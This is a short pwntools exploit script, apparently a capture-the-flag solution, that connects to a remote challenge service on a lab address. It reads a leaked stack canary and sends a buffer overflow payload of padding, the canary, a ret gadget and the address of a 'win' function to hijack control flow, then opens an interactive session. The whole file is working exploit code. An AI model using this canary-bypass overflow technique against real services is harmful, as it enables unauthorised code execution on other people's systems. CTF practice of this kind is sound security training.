from pwn import *

# r = process("./challx")
r = remote("10.52.0.43", 5000)
elf = ELF("./challx")

context.arch = "amd64"
context.log_level = "debug"


r.recvuntil(b"Hey!, Don't forget this ok? ")
canary = int(r.read(16),16)
info(hex(canary))
payload = b"A"*56 + p64(canary) + b"B"*8 + p64(0x401016) + p64(elf.symbols.win)
r.sendlineafter(b"have?", payload)
r.interactive()

